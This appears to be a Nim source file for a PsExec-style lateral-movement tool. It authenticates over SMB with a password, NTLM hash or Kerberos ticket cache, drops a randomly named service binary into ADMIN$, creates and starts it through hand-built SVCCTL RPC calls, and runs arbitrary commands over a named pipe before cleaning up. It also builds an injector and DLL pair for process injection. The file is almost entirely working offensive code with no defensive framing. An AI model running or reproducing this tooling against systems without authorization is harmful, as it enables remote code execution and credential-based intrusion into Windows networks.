import std/[asyncdispatch, asyncnet, net, strutils, random, times, os, osproc]

import ../smb/client as smb

const
  SvcNameBase = "ne"

  SvcCtlUuidBytes = [
    byte 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35,
    0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03
  ]
  ScManagerAllAccess = 0x000F003F'u32
  ServiceAllAccess   = 0x000F01FF'u32
  ServiceWin32OwnProcess = 0x00000010'u32
  ServiceDemandStart = 0x00000003'u32
  ServiceErrorIgnore = 0x00000000'u32
  ServiceControlStop = 0x00000001'u32

type
  PsExecResult* = object
    host*: string
    port*: int
    username*: string
    domain*: string
    authenticated*: bool
    binaryUploaded*: bool
    serviceCreated*: bool
    serviceStarted*: bool
    pipeConnected*: bool
    output*: string
    exitCode*: int32
    message*: string
    error*: string
    success*: bool
    rpcStatus*: uint32
    scmStatus*: uint32

  PsExecSession* = ref object
    session*: smb.SmbSession
    rpcSession*: smb.SmbSession
    helperSession*: smb.SmbSession
    pipe*: smb.SmbPipeInfo
    helperPipe*: smb.SmbPipeInfo
    scmHandle*: string
    svcHandle*: string
    adminPath*: string
    message*: string
    authenticated*: bool
    ready*: bool

proc addU32Le(data: var string; value: uint32) =
  data.add char(value and 0xff)
  data.add char((value shr 8) and 0xff)
  data.add char((value shr 16) and 0xff)
  data.add char((value shr 24) and 0xff)

proc readU32Le(data: string; offset: int): uint32 =
  uint32(ord(data[offset])) or
    (uint32(ord(data[offset + 1])) shl 8) or
    (uint32(ord(data[offset + 2])) shl 16) or
    (uint32(ord(data[offset + 3])) shl 24)

proc padNdr4(data: var string) =
  while data.len mod 4 != 0: data.add char(0)

proc ndrUniqueWString(text: string; refId = 0x00020000'u32): string =
  result.addU32Le refId
  let utf = smb.toUtf16Le(text) & "\x00\x00"
  let charCount = uint32(utf.len div 2)
  result.addU32Le charCount
  result.addU32Le 0'u32
  result.addU32Le charCount
  result.add utf
  padNdr4(result)

proc ndrNullPointer(): string = result.addU32Le 0'u32

const svcSource = staticRead("svc/nimuxsvc.nim")

proc buildServiceBinary(): string =
  let tmp = getTempDir() / "nimuxsvc_build_" & $getCurrentProcessId()
  createDir(tmp)
  try:
    let src = tmp / "nimuxsvc.nim"
    writeFile(src, svcSource)
    let exe = tmp / "nimuxsvc.exe"
    let cmd = "nim --skipParentCfg:on c -d:mingw --cpu:amd64 --os:windows --app:console --threads:on --tlsEmulation:off" &
              " -d:release --opt:size --cc:gcc" &
              " --gcc.exe:x86_64-w64-mingw32-gcc" &
              " --gcc.linkerexe:x86_64-w64-mingw32-gcc" &
              " --passL:-static --nimcache:" & tmp / "cache" &
              " -o:" & exe & " " & src
    let (output, code) = execCmdEx(cmd)
    if code != 0:
      raise newException(IOError, "service compile failed:\n" & output)
    result = readFile(exe)
  finally:
    removeDir(tmp)

const asmSource = staticRead("svc/nimuxasm.nim")
const injSource  = staticRead("svc/nimuxinj.nim")

const crossFlags = " -d:mingw --cpu:amd64 --os:windows --threads:on --tlsEmulation:off -d:release --opt:size" &
                   " --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc" &
                   " --gcc.linkerexe:x86_64-w64-mingw32-gcc --passL:-static"

proc buildRunnerBinary*(): string =
  let tmp = getTempDir() / "nimuxasm_build_" & $getCurrentProcessId()
  createDir(tmp)
  try:
    let src = tmp / "nimuxasm.nim"
    writeFile(src, asmSource)
    let exe = tmp / "nimuxasm.exe"
    let cmd = "nim --skipParentCfg:on c" & crossFlags & " --app:console" &
              " --nimcache:" & tmp / "cache" &
              " -o:" & exe & " " & src
    let (output, code) = execCmdEx(cmd)
    if code != 0:
      raise newException(IOError, "runner compile failed:\n" & output)
    result = readFile(exe)
  finally:
    removeDir(tmp)

proc buildInjectorPair*(): tuple[dll, inj: string] =
  let tmp = getTempDir() / "nimuxinj_build_" & $getCurrentProcessId()
  createDir(tmp)
  try:
    let asmSrc = tmp / "nimuxasm.nim"
    let injSrc = tmp / "nimuxinj.nim"
    writeFile(asmSrc, asmSource)
    writeFile(injSrc, injSource)
    let dll = tmp / "nimuxasm.dll"
    let inj = tmp / "nimuxinj.exe"
    let dllCmd = "nim --skipParentCfg:on c" & crossFlags & " --app:lib -d:asDll" &
                 " --nimcache:" & tmp / "cache_dll" &
                 " -o:" & dll & " " & asmSrc
    let (dllOut, dllCode) = execCmdEx(dllCmd)
    if dllCode != 0:
      raise newException(IOError, "dll compile failed:\n" & dllOut)
    let injCmd = "nim --skipParentCfg:on c" & crossFlags & " --app:console" &
                 " --nimcache:" & tmp / "cache_inj" &
                 " -o:" & inj & " " & injSrc
    let (injOut, injCode) = execCmdEx(injCmd)
    if injCode != 0:
      raise newException(IOError, "injector compile failed:\n" & injOut)
    result.dll = readFile(dll)
    result.inj = readFile(inj)
  finally:
    removeDir(tmp)

proc randomToken*(): string =
  var rng = initRand(int(getTime().toUnix()) xor cast[int](addr result))
  for _ in 0 ..< 10:
    let c = rng.rand(35)
    if c < 10: result.add chr(ord('0') + c)
    else: result.add chr(ord('a') + (c - 10))

proc buildROpenSCManagerWStub(host: string; access: uint32): string =
  result.add ndrUniqueWString("\\\\" & host)
  result.add ndrUniqueWString("ServicesActive")
  result.addU32Le access

proc buildRCreateServiceWStub(scm: string; serviceName, binaryPath: string): string =
  if scm.len != 20: raise newException(ValueError, "scm handle bad")
  result.add scm
  let nameUtf = smb.toUtf16Le(serviceName) & "\x00\x00"
  let nameChars = uint32(nameUtf.len div 2)
  result.addU32Le nameChars
  result.addU32Le 0'u32
  result.addU32Le nameChars
  result.add nameUtf
  padNdr4(result)
  result.add ndrUniqueWString(serviceName)
  result.addU32Le ServiceAllAccess
  result.addU32Le ServiceWin32OwnProcess
  result.addU32Le ServiceDemandStart
  result.addU32Le ServiceErrorIgnore
  let binUtf = smb.toUtf16Le(binaryPath) & "\x00\x00"
  let binChars = uint32(binUtf.len div 2)
  result.addU32Le binChars
  result.addU32Le 0'u32
  result.addU32Le binChars
  result.add binUtf
  padNdr4(result)
  result.add ndrNullPointer()
  result.add ndrNullPointer()
  result.add ndrNullPointer()
  result.addU32Le 0'u32
  result.add ndrNullPointer()
  result.add ndrNullPointer()
  result.addU32Le 0'u32

proc buildROpenServiceWStub(scm: string; serviceName: string): string =
  if scm.len != 20: raise newException(ValueError, "scm handle bad")
  result.add scm
  let nameUtf = smb.toUtf16Le(serviceName) & "\x00\x00"
  let nameChars = uint32(nameUtf.len div 2)
  result.addU32Le nameChars
  result.addU32Le 0'u32
  result.addU32Le nameChars
  result.add nameUtf
  padNdr4(result)
  result.addU32Le ServiceAllAccess

proc buildRStartServiceWStub(svc: string): string =
  if svc.len != 20: raise newException(ValueError, "svc handle bad")
  result.add svc
  result.addU32Le 0'u32
  result.add ndrNullPointer()

proc buildRControlServiceStub(svc: string; control: uint32): string =
  if svc.len != 20: raise newException(ValueError, "svc handle bad")
  result.add svc
  result.addU32Le control

proc buildRDeleteServiceStub(svc: string): string =
  if svc.len != 20: raise newException(ValueError, "svc handle bad")
  result.add svc

proc buildRCloseServiceHandleStub(handle: string): string =
  if handle.len != 20: raise newException(ValueError, "handle bad")
  result.add handle

proc parseScmHandle(stub: string): tuple[handle: string; status: uint32] =
  if stub.len < 24: return ("", 0xffffffff'u32)
  result.handle = stub[0 ..< 20]
  result.status = readU32Le(stub, 20)

proc parseSvcHandle(stub: string): tuple[handle: string; status: uint32] =
  if stub.len >= 28:
    result.handle = stub[4 ..< 24]
    result.status = readU32Le(stub, stub.len - 4)
  elif stub.len >= 24:
    result.handle = stub[0 ..< 20]
    result.status = readU32Le(stub, stub.len - 4)
  else:
    result = ("", 0xffffffff'u32)

proc uploadServiceBinary(session: smb.SmbSession; remotePath: string;
                         contents: string): Future[uint32] {.async.} =
  const DesiredAccess: uint32 = 0x00120196
  const CreateAlways: uint32  = 0x00000005
  const NonDirectoryFile: uint32 = 0x40
  if session.adminTreeId == 0: return 0xFFFFFFFF'u32
  let ctx = session.ctx
  let chunkSize = 65535
  let prevTree = ctx.treeId
  ctx.treeId = session.adminTreeId
  try:
    let createPkt = ctx.signed(smb.buildSmbFileCreateRequest(remotePath,
      DesiredAccess, CreateAlways, NonDirectoryFile,
      ctx.nextMid(), ctx.sessionId, session.adminTreeId))
    await ctx.socket.send(createPkt)
    let createResp = await smb.recvOneSmb(ctx.socket, ctx.timeoutMs)
    let fid = smb.fileIdFromCreateResponse(createResp)
    let createSt = if createResp.len >= 16: readU32Le(createResp, 12) else: 0xFFFFFFFF'u32
    if fid.len != 16:
      return 0x01_000000'u32 or (createSt and 0xFFFFFF'u32)
    var offset = 0
    while offset < contents.len:
      let take = min(chunkSize, contents.len - offset)
      let chunk = contents[offset ..< offset + take]
      let wp = ctx.signed(smb.buildSmbWriteRequest(fid, chunk,
        ctx.nextMid(), ctx.sessionId, session.adminTreeId, uint64(offset)))
      await ctx.socket.send(wp)
      let wr = await smb.recvOneSmb(ctx.socket, ctx.timeoutMs)
      let wst = if wr.len >= 16: readU32Le(wr, 12) else: 0xFFFFFFFF'u32
      if wst != 0: return 0x02_000000'u32 or (wst and 0xFFFFFF'u32)
      offset += take
    let cp = ctx.signed(smb.buildSmbCloseRequest(fid,
      ctx.nextMid(), ctx.sessionId, session.adminTreeId))
    await ctx.socket.send(cp)
    discard await smb.recvOneSmb(ctx.socket, ctx.timeoutMs)
    return 0'u32
  finally:
    ctx.treeId = prevTree

proc deleteAdminFile(session: smb.SmbSession; remotePath: string): Future[void] {.async.} =
  const DeleteAccess: uint32 = 0x00010000
  if session.adminTreeId == 0: return
  let ctx = session.ctx
  let prevTree = ctx.treeId
  ctx.treeId = session.adminTreeId
  try:
    let createPkt = ctx.signed(smb.buildSmbFileCreateRequest(remotePath,
      DeleteAccess, 0x00000001'u32, 0x00000040'u32,
      ctx.nextMid(), ctx.sessionId, session.adminTreeId))
    await ctx.socket.send(createPkt)
    let createResp = await smb.recvOneSmb(ctx.socket, ctx.timeoutMs)
    let fid = smb.fileIdFromCreateResponse(createResp)
    if fid.len != 16: return
    let dispPkt = ctx.signed(smb.buildSmbSetInfoDispositionDelete(fid,
      ctx.nextMid(), ctx.sessionId, session.adminTreeId))
    await ctx.socket.send(dispPkt)
    discard await smb.recvOneSmb(ctx.socket, ctx.timeoutMs)
    let cp = ctx.signed(smb.buildSmbCloseRequest(fid,
      ctx.nextMid(), ctx.sessionId, session.adminTreeId))
    await ctx.socket.send(cp)
    discard await smb.recvOneSmb(ctx.socket, ctx.timeoutMs)
  except CatchableError:
    discard
  finally:
    ctx.treeId = prevTree

proc pipeRead(ctx: smb.SmbRpcCtx; fid: string; want: int): Future[string] {.async.} =
  result = ""
  while result.len < want:
    let chunk = min(want - result.len, 60_000)
    let pkt = ctx.signed(smb.buildSmbReadRequest(fid, uint32(chunk),
      ctx.nextMid(), ctx.sessionId, ctx.treeId))
    await ctx.socket.send(pkt)
    var resp = await smb.recvOneSmb(ctx.socket, ctx.timeoutMs)
    while resp.len >= 16 and readU32Le(resp, 12) == 0x00000103'u32:
      resp = await smb.recvOneSmb(ctx.socket, ctx.timeoutMs)
    if resp.len < 16: return
    let status = readU32Le(resp, 12)
    let data = smb.parseSmbReadData(resp)
    if data.len == 0:
      return
    result.add data
    if status != 0 and status != 0x80000005'u32:
      return

proc pipeReadExact(ctx: smb.SmbRpcCtx; fid: string; n: int): Future[string] {.async.} =
  result = ""
  while result.len < n:
    let chunk = await pipeRead(ctx, fid, n - result.len)
    if chunk.len == 0: return ""
    result.add chunk

proc pipeWrite(ctx: smb.SmbRpcCtx; fid, payload: string): Future[void] {.async.} =
  let pkt = ctx.signed(smb.buildSmbWriteRequest(fid, payload,
    ctx.nextMid(), ctx.sessionId, ctx.treeId))
  await ctx.socket.send(pkt)
  discard await smb.recvOneSmb(ctx.socket, ctx.timeoutMs)

proc openPipeWithRetry(ctx: smb.SmbRpcCtx; name: string;
                       attempts = 40; delayMs = 250): Future[smb.SmbPipeInfo] {.async.} =
  for i in 0 ..< attempts:
    let p = await smb.openSmbPipe(ctx, name)
    if p.opened:
      return p
    await sleepAsync(delayMs)
  result = await smb.openSmbPipe(ctx, name)

proc retryableSmbSessionError(message: string): bool =
  let m = message.toLowerAscii()
  result = m.contains("0xc0000017") or
    m.contains("0xc0000205") or
    m.contains("connect timeout") or
    m.contains("negotiate failed") or
    m.contains("server resources")

proc establishPsexecSmbSession(host: string; port, timeoutMs: int;
                               credential: smb.SmbCredential;
                               authMethod: smb.SmbAuthMethod): Future[smb.SmbSession] {.async.} =
  var last: smb.SmbSession = nil
  for attempt in 0 ..< 4:
    if attempt > 0:
      await sleepAsync(1500 * attempt)
    last = await smb.establishSmbSession(host, port, timeoutMs, credential, authMethod)
    if last != nil and last.authenticated:
      return last
    let message = if last == nil: "no session" else: last.message
    if not retryableSmbSessionError(message):
      return last
  result = last

proc psExec*(host: string; port, timeoutMs: int;
             username, password, ntlmHash, domain, command: string;
             keepBinary = false;
             authMethod: smb.SmbAuthMethod = smb.samNtlm;
             ccache = ""): Future[PsExecResult] {.async.} =
  result.host = host
  result.port = port
  result.username = username
  result.domain = domain
  let svcBinary = buildServiceBinary()

  let cred = smb.SmbCredential(
    username: username, password: password,
    ntlmHash: ntlmHash, domain: domain,
    ccache: ccache)
  let session = await establishPsexecSmbSession(host, port, timeoutMs, cred, authMethod)
  if session == nil or not session.authenticated:
    result.message = if session == nil: "no session" else: session.message
    return
  result.authenticated = true
  if session.adminTreeId == 0:
    result.message = "ADMIN$ tree not available — psexec needs it to drop the helper"
    return

  let svcToken  = randomToken()
  let pipeToken = randomToken()
  let remoteName  = SvcNameBase & svcToken & ".exe"
  let adminPath   = "Temp\\" & remoteName
  let serviceName = SvcNameBase & svcToken
  let pipeName    = SvcNameBase & pipeToken
  let binaryPath  = "\"C:\\Windows\\Temp\\" & remoteName & "\" " & serviceName & " " & pipeName

  var rpcSession: smb.SmbSession = nil
  try:
    let uploadSt = await uploadServiceBinary(session, adminPath, svcBinary)
    if uploadSt != 0:
      result.message = "upload failed 0x" & uploadSt.toHex(8) & " (ADMIN$\\" & adminPath & ")"
      return
    result.binaryUploaded = true

    rpcSession = await establishPsexecSmbSession(host, port, timeoutMs, cred, authMethod)
    if rpcSession == nil or not rpcSession.authenticated:
      result.message = "reconnect for RPC failed"
      return
    let ctx = rpcSession.ctx

    let pipe = await smb.openSmbPipe(ctx, "svcctl")
    if not pipe.opened:
      result.message = "svcctl pipe open failed 0x" & pipe.status.toHex(8)
      return
    let bindAck = await smb.rpcBindPipe(ctx, pipe,
      smb.buildDceRpcBind(SvcCtlUuidBytes, 2'u16, 0'u16, 1'u32))
    if not bindAck.bound:
      result.message = "SVCCTL bind failed"
      return
    let openSt = await smb.rpcCall(ctx, pipe, 15'u16,
      buildROpenSCManagerWStub(host, ScManagerAllAccess), 2'u32)
    let scm = parseScmHandle(openSt)
    result.scmStatus = scm.status
    if scm.handle.len != 20 or scm.status != 0:
      result.message = "ROpenSCManagerW failed 0x" & scm.status.toHex(8)
      return
    var createSt = await smb.rpcCall(ctx, pipe, 12'u16,
      buildRCreateServiceWStub(scm.handle, serviceName, binaryPath), 3'u32)
    if createSt.len < 24:
      result.message = "RCreateServiceW short reply"
      return
    var parsed = parseSvcHandle(createSt)
    result.rpcStatus = parsed.status
    if parsed.status == 0x431'u32:
      let openSt = await smb.rpcCall(ctx, pipe, 16'u16,
        buildROpenServiceWStub(scm.handle, serviceName), 20'u32)
      let opened = parseScmHandle(openSt)
      if opened.handle.len == 20 and opened.status == 0:
        discard await smb.rpcCall(ctx, pipe, 1'u16,
          buildRControlServiceStub(opened.handle, ServiceControlStop), 21'u32)
        discard await smb.rpcCall(ctx, pipe, 2'u16,
          buildRDeleteServiceStub(opened.handle), 22'u32)
        discard await smb.rpcCall(ctx, pipe, 0'u16,
          buildRCloseServiceHandleStub(opened.handle), 23'u32)
      createSt = await smb.rpcCall(ctx, pipe, 12'u16,
        buildRCreateServiceWStub(scm.handle, serviceName, binaryPath), 24'u32)
      if createSt.len < 24:
        result.message = "RCreateServiceW short reply (retry)"
        return
      parsed = parseSvcHandle(createSt)
      result.rpcStatus = parsed.status
    if parsed.status != 0 or parsed.handle.len != 20:
      result.message = "RCreateServiceW failed 0x" & parsed.status.toHex(8)
      discard await smb.rpcCall(ctx, pipe, 0'u16,
        buildRCloseServiceHandleStub(scm.handle), 99'u32)
      return
    let createHandle = parsed.handle
    result.serviceCreated = true
    let openSt2 = await smb.rpcCall(ctx, pipe, 16'u16,
      buildROpenServiceWStub(scm.handle, serviceName), 25'u32)
    let openedSvc = parseScmHandle(openSt2)
    let svcHandle =
      if openedSvc.handle.len == 20 and openedSvc.status == 0:
        openedSvc.handle
      else:
        createHandle
    let startFuture = smb.rpcCall(ctx, pipe, 19'u16,
      buildRStartServiceWStub(svcHandle), 5'u32)
    result.serviceStarted = true

    let helperCtx = session.ctx
    let helperPipe = await openPipeWithRetry(helperCtx, pipeName)
    if not helperPipe.opened:
      result.message = "could not open \\pipe\\" & pipeName & " — service may have crashed"
    else:
      result.pipeConnected = true
      let cmdUtf = smb.toUtf16Le(command)
      var frame = ""
      frame.addU32Le uint32(cmdUtf.len)
      frame.add cmdUtf
      await pipeWrite(helperCtx, helperPipe.fileId, frame)

      while true:
        let hdr = await pipeReadExact(helperCtx, helperPipe.fileId, 4)
        if hdr.len < 4:
          result.message = "pipe closed before EOF marker"
          break
        let frameLen = readU32Le(hdr, 0)
        if frameLen == 0xFFFFFFFF'u32:
          let exitBuf = await pipeReadExact(helperCtx, helperPipe.fileId, 4)
          if exitBuf.len == 4:
            result.exitCode = cast[int32](readU32Le(exitBuf, 0))
          result.success = true
          result.message = "command exited with code " & $result.exitCode
          break
        if frameLen == 0 or frameLen > 1_048_576'u32:
          result.message = "bad frame length " & $frameLen
          break
        let payload = await pipeReadExact(helperCtx, helperPipe.fileId, int(frameLen))
        result.output.add payload

      let cp = helperCtx.signed(smb.buildSmbCloseRequest(helperPipe.fileId,
        helperCtx.nextMid(), helperCtx.sessionId, helperCtx.treeId))
      await helperCtx.socket.send(cp)
      discard await smb.recvOneSmb(helperCtx.socket, helperCtx.timeoutMs)

    if not startFuture.finished:
      try:
        discard await withTimeout(startFuture, 1000)
      except CatchableError:
        discard

    discard await smb.rpcCall(ctx, pipe, 1'u16,
      buildRControlServiceStub(svcHandle, ServiceControlStop), 6'u32)
    discard await smb.rpcCall(ctx, pipe, 2'u16,
      buildRDeleteServiceStub(svcHandle), 7'u32)
    discard await smb.rpcCall(ctx, pipe, 0'u16,
      buildRCloseServiceHandleStub(svcHandle), 8'u32)
    discard await smb.rpcCall(ctx, pipe, 0'u16,
      buildRCloseServiceHandleStub(scm.handle), 9'u32)
  except CatchableError as error:
    result.error = error.msg.splitLines()[0]
    if result.message.len == 0:
      result.message = "psexec error"
  finally:
    if result.binaryUploaded and not keepBinary:
      try:
        let cleanSession = if rpcSession != nil and rpcSession.adminTreeId != 0: rpcSession else: session
        await deleteAdminFile(cleanSession, adminPath)
      except CatchableError: discard

proc openPsExecSession*(host: string; port, timeoutMs: int;
                        username, password, ntlmHash, domain: string;
                        authMethod: smb.SmbAuthMethod = smb.samNtlm;
                        ccache = ""): Future[PsExecSession] {.async.} =
  result = PsExecSession()
  let svcBinary = buildServiceBinary()
  let cred = smb.SmbCredential(username: username, password: password,
    ntlmHash: ntlmHash, domain: domain, ccache: ccache)
  let session = await establishPsexecSmbSession(host, port, timeoutMs, cred, authMethod)
  if session == nil or not session.authenticated:
    result.message = if session == nil: "no session" else: session.message
    return
  result.authenticated = true
  result.session = session
  if session.adminTreeId == 0:
    result.message = if session.message.len > 0: "ADMIN$ not available: " & session.message
                     else: "ADMIN$ not available"
    return
  let svcToken  = randomToken()
  let pipeToken = randomToken()
  let remoteName  = SvcNameBase & svcToken & ".exe"
  let adminPath   = "Temp\\" & remoteName
  let serviceName = SvcNameBase & svcToken
  let pipeName    = SvcNameBase & pipeToken
  let binaryPath  = "\"C:\\Windows\\Temp\\" & remoteName & "\" " & serviceName & " " & pipeName
  result.adminPath = adminPath
  let uploadSt = await uploadServiceBinary(session, adminPath, svcBinary)
  if uploadSt != 0:
    result.message = "upload failed 0x" & uploadSt.toHex(8)
    return
  let rpcSession = await establishPsexecSmbSession(host, port, timeoutMs, cred, authMethod)
  if rpcSession == nil or not rpcSession.authenticated:
    result.message = "reconnect for RPC failed"
    return
  result.rpcSession = rpcSession
  result.helperSession = session
  let ctx = rpcSession.ctx
  let pipe = await smb.openSmbPipe(ctx, "svcctl")
  if not pipe.opened:
    result.message = "svcctl pipe open failed"
    return
  result.pipe = pipe
  let bindAck = await smb.rpcBindPipe(ctx, pipe,
    smb.buildDceRpcBind(SvcCtlUuidBytes, 2'u16, 0'u16, 1'u32))
  if not bindAck.bound:
    result.message = "SVCCTL bind failed"
    return
  let openSt = await smb.rpcCall(ctx, pipe, 15'u16,
    buildROpenSCManagerWStub(host, ScManagerAllAccess), 2'u32)
  let scm = parseScmHandle(openSt)
  if scm.handle.len != 20 or scm.status != 0:
    result.message = "ROpenSCManagerW failed 0x" & scm.status.toHex(8)
    return
  result.scmHandle = scm.handle
  var createSt = await smb.rpcCall(ctx, pipe, 12'u16,
    buildRCreateServiceWStub(scm.handle, serviceName, binaryPath), 3'u32)
  if createSt.len < 24:
    result.message = "RCreateServiceW short reply"
    return
  var parsed = parseSvcHandle(createSt)
  if parsed.status == 0x431'u32:
    let openSt2 = await smb.rpcCall(ctx, pipe, 16'u16,
      buildROpenServiceWStub(scm.handle, serviceName), 4'u32)
    let opened = parseScmHandle(openSt2)
    if opened.handle.len == 20 and opened.status == 0:
      discard await smb.rpcCall(ctx, pipe, 1'u16,
        buildRControlServiceStub(opened.handle, ServiceControlStop), 5'u32)
      discard await smb.rpcCall(ctx, pipe, 2'u16,
        buildRDeleteServiceStub(opened.handle), 6'u32)
      discard await smb.rpcCall(ctx, pipe, 0'u16,
        buildRCloseServiceHandleStub(opened.handle), 7'u32)
    createSt = await smb.rpcCall(ctx, pipe, 12'u16,
      buildRCreateServiceWStub(scm.handle, serviceName, binaryPath), 8'u32)
    if createSt.len < 24:
      result.message = "RCreateServiceW short reply (retry)"
      return
    parsed = parseSvcHandle(createSt)
  if parsed.status != 0 or parsed.handle.len != 20:
    result.message = "RCreateServiceW failed 0x" & parsed.status.toHex(8)
    return
  let createHandle = parsed.handle
  let openSvc = await smb.rpcCall(ctx, pipe, 16'u16,
    buildROpenServiceWStub(scm.handle, serviceName), 9'u32)
  let openedSvc = parseScmHandle(openSvc)
  let svcHandle = if openedSvc.handle.len == 20 and openedSvc.status == 0: openedSvc.handle
                  else: createHandle
  result.svcHandle = svcHandle
  let startFuture = smb.rpcCall(ctx, pipe, 19'u16,
    buildRStartServiceWStub(svcHandle), 10'u32)
  discard startFuture
  let helperPipe = await openPipeWithRetry(session.ctx, pipeName)
  if not helperPipe.opened:
    result.message = "could not open \\pipe\\" & pipeName
    return
  result.helperPipe = helperPipe
  result.ready = true

proc runPsExecShellCommand*(ps: PsExecSession; command: string): Future[tuple[output: string; exitCode: int32; err: string]] {.async.} =
  let ctx = (if ps.helperSession != nil: ps.helperSession else: ps.rpcSession).ctx
  let cmdUtf = smb.toUtf16Le(command)
  var frame = ""
  frame.addU32Le uint32(cmdUtf.len)
  frame.add cmdUtf
  await pipeWrite(ctx, ps.helperPipe.fileId, frame)
  while true:
    let hdr = await pipeReadExact(ctx, ps.helperPipe.fileId, 4)
    if hdr.len < 4:
      result.err = "pipe closed unexpectedly"
      break
    let frameLen = readU32Le(hdr, 0)
    if frameLen == 0xFFFFFFFF'u32:
      let exitBuf = await pipeReadExact(ctx, ps.helperPipe.fileId, 4)
      if exitBuf.len == 4:
        result.exitCode = cast[int32](readU32Le(exitBuf, 0))
      break
    if frameLen == 0 or frameLen > 1_048_576'u32:
      result.err = "bad frame length " & $frameLen
      break
    let payload = await pipeReadExact(ctx, ps.helperPipe.fileId, int(frameLen))
    result.output.add payload

proc closePsExecSession*(ps: PsExecSession): Future[void] {.async.} =
  if ps == nil: return
  let helperCtx = (if ps.helperSession != nil: ps.helperSession else: ps.rpcSession).ctx
  let ctx = ps.rpcSession.ctx
  if ps.ready and ps.helperPipe.opened:
    var goodbye = ""
    goodbye.addU32Le 0'u32
    try: await pipeWrite(helperCtx, ps.helperPipe.fileId, goodbye)
    except CatchableError: discard
    let cp = helperCtx.signed(smb.buildSmbCloseRequest(ps.helperPipe.fileId,
      helperCtx.nextMid(), helperCtx.sessionId, helperCtx.treeId))
    try: await helperCtx.socket.send(cp)
    except CatchableError: discard
    try: discard await smb.recvOneSmb(helperCtx.socket, helperCtx.timeoutMs)
    except CatchableError: discard
  if ps.svcHandle.len == 20:
    try:
      discard await smb.rpcCall(ctx, ps.pipe, 1'u16,
        buildRControlServiceStub(ps.svcHandle, ServiceControlStop), 50'u32)
      discard await smb.rpcCall(ctx, ps.pipe, 2'u16,
        buildRDeleteServiceStub(ps.svcHandle), 51'u32)
      discard await smb.rpcCall(ctx, ps.pipe, 0'u16,
        buildRCloseServiceHandleStub(ps.svcHandle), 52'u32)
    except CatchableError: discard
  if ps.scmHandle.len == 20:
    try:
      discard await smb.rpcCall(ctx, ps.pipe, 0'u16,
        buildRCloseServiceHandleStub(ps.scmHandle), 53'u32)
    except CatchableError: discard
  if ps.adminPath.len > 0:
    let cleanSession = if ps.rpcSession != nil and ps.rpcSession.adminTreeId != 0: ps.rpcSession
                       else: ps.session
    try: await deleteAdminFile(cleanSession, ps.adminPath)
    except CatchableError: discard
